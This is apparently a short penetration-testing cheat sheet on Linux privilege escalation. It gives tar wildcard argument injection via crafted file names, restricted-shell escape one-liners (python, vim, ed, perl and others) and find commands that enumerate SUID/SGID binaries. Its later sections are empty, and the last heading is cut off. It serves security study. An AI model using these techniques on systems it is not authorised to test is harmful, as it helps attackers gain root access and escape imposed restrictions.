# Important Terminology 


# Wildcard Abuse 
- Characters like *, ?, [],~ and ... are special globbing characters used to match filenames
- When a command receives a wildcard, the shell expands it into a list of matching filenames before passing them to the command
- If attacker can create files with specific names in a directory where a privileged script or command uses a wildcard, they can inject arguments

```
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```



# Restricted Shell 
[Resource-1](https://github.com/The-Red-Serpent/restricted-shell-escape-cheatsheet) | [Resource 2](https://blog.pentesteracademy.com/breaking-out-of-a-restricted-shell-linux-privilege-escalation-3fb2700cb85e) |[Resource 3](https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/)


```bash

#Pager commands
more file-name

less file-name 
```


```bash
ed
!'/bin/sh'
```

```python
python -c 'import os; os.system("/bin/sh")'  
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
vim
:set shell=/bin/bash
:shell
```


```perl -e 'exec "/bin/sh";'
```
```
perl: exec "/bin/sh";
```
```
ruby: exec "/bin/sh"
```
```
lua: os.execute('/bin/sh')
```
```
irb(main:001:0> exec "/bin/sh"
```
# Set UID/SUID Permissions 

**Setuid:** permission found in linux that allows a user to execute script or action with the permissions of a user

```

find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

```

```
find / -perm -u=s -type f 2>/dev/null
```
**setgid:** Permission that lets us run binaries as if we were part of the group that created them. files can be enumerated using following command 

```

find / -uid 0 -perm -6000 -type f 2>/dev/null

```



# Sudo Rights Abuse 



# Privileged Group s
